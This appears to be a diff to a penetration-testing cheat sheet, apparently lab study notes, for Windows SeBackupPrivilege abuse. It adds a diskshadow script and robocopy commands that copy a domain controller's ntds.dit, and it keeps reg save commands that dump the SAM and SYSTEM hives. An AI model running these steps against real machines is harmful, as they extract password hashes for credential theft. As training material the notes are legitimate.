@@ -1193,17 +1193,24 @@ PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
 
 PS C:\htb> Set-SeBackupPrivilege
 PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+```
 
+https://book.hacktricks.xyz/v/jp/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges
+```powershell
+#ntds.dit
+C:\Windows\Temp> diskshadow.exe /s z.dsh
+C:\Windows\Temp> robocopy /B z:\Windows\NTDS .\ntds ntds.dit
 
 # SAM SYSTEM
 reg save HKLM\SYSTEM SYSTEM
 reg save HKLM\SAM SAM
 ```
-
-https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
+z.dsh
 ```powershell
-diskshadow.exe
-Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+set context persistent nowriters
+add volume c: alias someAlias
+create
+expose %someAlias% z:
 ```
 
 #### LoadDriver
